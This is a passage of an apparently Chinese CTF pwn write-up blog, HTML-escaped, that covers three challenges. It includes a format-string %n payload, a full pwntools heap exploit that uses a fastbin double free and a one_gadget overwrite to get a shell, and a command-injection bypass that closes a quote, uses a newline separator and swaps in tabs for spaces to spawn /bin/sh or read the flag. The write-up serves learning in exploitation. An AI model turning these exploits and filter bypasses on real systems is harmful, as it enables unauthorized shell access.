class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#payload = b&amp;quot;%58248c%31$n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;%.26204x%30$n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;favourite food: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;You like &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		存储备忘的信息&lt;/p&gt;
&lt;p&gt;%10$p.%15$p.aaa&lt;/p&gt;
&lt;p&gt;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.&lt;/p&gt;
&lt;p&gt;0x7fffffffbdc0.0x7ffff7dd3780.0x7ffff7b043c0.0x7ffff7ff6700.0x9.0x1ffffe540.0xc144e077e3cf5200.0x555555554b60.0x7ffff7a2d840.(nil).37&lt;/p&gt;
&lt;p&gt;为什么不按顺序了…&lt;/p&gt;
&lt;p&gt;0x7fffffffbdc0.0x7ffff7dd3780.0x7ffff7b043c0.0x7ffff7ff6700.0x9.0x3ffffe540.0xb1fb67251108900.0x555555554b60.0x7ffff7a2d840.(nil).0x7fffffffe548test’&lt;/p&gt;
&lt;p&gt;%12$p.%13$p.%14$p.%15$p.aaa&lt;/p&gt;
&lt;p&gt;0x1f7ffcca0.0x555555554a67.(nil).0x7da3d3a4544d517e.aaa37&lt;/p&gt;
&lt;p&gt;%16$p.%17$p.%18$p.%19$p.aaa&lt;/p&gt;
&lt;p&gt;x555555554820.0x7fffffffe540.(nil).(nil).aaa&lt;/p&gt;
&lt;p&gt;%20$p.%21$p.%22$p.%23$p.aaa&lt;/p&gt;
&lt;p&gt;0x4f7197cdb841edfc.0x4f718777df51edfc.(nil).(nil).aaa&lt;/p&gt;
&lt;p&gt;%24$p.%25$p.%26$p.%27$p.aaa&lt;/p&gt;
&lt;p&gt;(nil).0x7fffffffe558.0x7ffff7ffe168.0x7ffff7de780b.aaa&lt;/p&gt;
&lt;p&gt;%28$p.%29$p.%30$p.%31$p.aaa&lt;/p&gt;
&lt;p&gt;(nil).(nil).0x555555554820.0x7fffffffe540.aaa&lt;/p&gt;
&lt;p&gt;%32$p.%33$p.%34$p.%35$p.aaa&lt;/p&gt;
&lt;p&gt;(nil).0x555555554849.0x7fffffffe538.0x1c.aaa&lt;/p&gt;
&lt;p&gt;%36$p.%37$p.%38$p.%39$p.aaa&lt;/p&gt;
&lt;p&gt;0x1.0x7fffffffe79c.(nil).0x7fffffffe7ba.aaa&lt;/p&gt;
&lt;p&gt;0x7fffffffe388&lt;/p&gt;
&lt;p&gt;0xffffe388&lt;/p&gt;
&lt;p&gt;0xe388&lt;/p&gt;
&lt;p&gt;11个位置 -0xd0&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_52877079/article/details/129756543&#34;&gt;https://blog.csdn.net/qq_52877079/article/details/129756543&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/184717&#34;&gt;https://www.anquanke.com/post/id/184717&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;easynote&#34;&gt;&lt;a href=&#34;#easynote&#34; class=&#34;headerlink&#34; title=&#34;easynote&#34;&gt;&lt;/a&gt;easynote&lt;/h1&gt;&lt;p&gt;​		简单的一道菜单堆题,看的时候很眼熟很眼熟,果然是之前做过的,只是稍微改动&lt;/p&gt;
&lt;p&gt;​		&lt;a href=&#34;https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/&#34;&gt;https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		开启了pie,那就用largebin smallbin的main_arena来泄露地址,&lt;/p&gt;
&lt;p&gt;​		这里有个小坑,就是接收返回地址的时候一直接收不到,注意这是因为先接收到了\n,用recv应该是接收到\n为止? 所以可以用多个recv或者recvuntil,&lt;/p&gt;
&lt;p&gt;​		malloc有检测,回头分析源码的时候可以具体看看&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = &lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(elf)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#p = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;node4.buuoj.cn&amp;quot;&lt;/span&gt;,25350)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def add(size,content):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;5. exit&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;The length of your content ---&amp;gt;&amp;#x27;&lt;/span&gt;, str(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Content ---&amp;gt;&amp;#x27;&lt;/span&gt;, content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def edit(index, size,content):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;5. exit&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Index ---&amp;gt;&amp;#x27;&lt;/span&gt;, str(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;The length of your content ---&amp;gt;&amp;#x27;&lt;/span&gt;, str(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Content ---&amp;gt;&amp;#x27;&lt;/span&gt;, content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def show(index):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;5. exit&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;4&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Index ---&amp;gt;&amp;#x27;&lt;/span&gt;, str(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def delete(index):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;5. exit&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Index ---&amp;gt;&amp;#x27;&lt;/span&gt;, str(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;xielu&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;dizhi&amp;quot;&lt;/span&gt;) # &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; 泄露地址用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;hebing&amp;quot;&lt;/span&gt;) # 防止合并&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_addr = u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,b&lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;)) - &lt;span class=&#34;number&#34;&gt;0x3c4b78&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(hex(libc_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# fastbin double free修改&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0x602022&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;b&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;,b&lt;span class=&#34;string&#34;&gt;&amp;quot;\x40\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;+p64(libc_addr+&lt;span class=&#34;number&#34;&gt;0x4527a&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;server&#34;&gt;&lt;a href=&#34;#server&#34; class=&#34;headerlink&#34; title=&#34;server&#34;&gt;&lt;/a&gt;server&lt;/h1&gt;&lt;p&gt;​		当时做的时候没想到栈的重叠的问题,单纯过滤肯定是没戏的.咋说捏,只会一些传统的套路是不行的,那只是基础,要在此之上更上一个纬度,看清事物的本质,学会变通才能应对更复杂的情况.&lt;/p&gt;
&lt;p&gt;​		对此题的反思就是,首先还是基础,要打好基础,打好操作系统原理的基础,如果懂这个的话,估计其实很容易想到重叠的问题.然后再培养细心以及一些自动化工具帮你寻找类似的点.&lt;/p&gt;
&lt;h2 id=&#34;思路一&#34;&gt;&lt;a href=&#34;#思路一&#34; class=&#34;headerlink&#34; title=&#34;思路一&#34;&gt;&lt;/a&gt;思路一&lt;/h2&gt;&lt;p&gt;​		access校验的长度有限,为32&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;snprintf&lt;/span&gt;(name, &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;uLL, &lt;span class=&#34;string&#34;&gt;&amp;quot;/keys/%s.key&amp;quot;&lt;/span&gt;, s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这个长度是&lt;span class=&#34;number&#34;&gt;27&lt;/span&gt;,加上/keys就是&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;../../../../../././bin/sh #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/keys/../../../../../././bin/sh 最后access的是这个文件,肯定是存在的&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		&lt;/p&gt;
&lt;p&gt;​		然后就是命令拼接了,&lt;font color=&#34;red&#34;&gt;存在未初始化漏洞,栈上有残留数据&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		第二次输入个单引号就好了, \n也可以作为命令分隔符,所以前面那个add_user -u ‘’就是没用的了,直接执行后面的&amp;#x2F;bin&amp;#x2F;sh了&lt;/p&gt;
&lt;p&gt;​		过滤 ; &amp;amp; &amp;#96; | $ 空格 ( ) {} - &amp;#x2F; \&lt;/p&gt;
&lt;p&gt;​		这个不用写脚本,&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;第一次选&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,输入&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;../../../../../././bin/sh #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然后选&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,输入&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然后就闭合了,就可以getshell了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;add_user -u &amp;#x27;%s&amp;#x27; -p &amp;#x27;888888&amp;#x27;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;► &lt;span class=&#34;number&#34;&gt;0x555555555748&lt;/span&gt;    call   system@plt                &amp;lt;system@plt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        command: &lt;span class=&#34;number&#34;&gt;0x7fffffffe410&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;quot;add_user -u &amp;#x27;&amp;#x27;\n/bin/sh #&amp;#x27; -p &amp;#x27;888888&amp;#x27;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;思路二&#34;&gt;&lt;a href=&#34;#思路二&#34; class=&#34;headerlink&#34; title=&#34;思路二&#34;&gt;&lt;/a&gt;思路二&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;\ncat\tfl*\n&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		这里也用到覆盖了,看exp就可以理解了,exp的12就是随便输入的,后面的’\n会替代&lt;/p&gt;
&lt;p&gt;​				过滤的空格可以用\t替代&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span 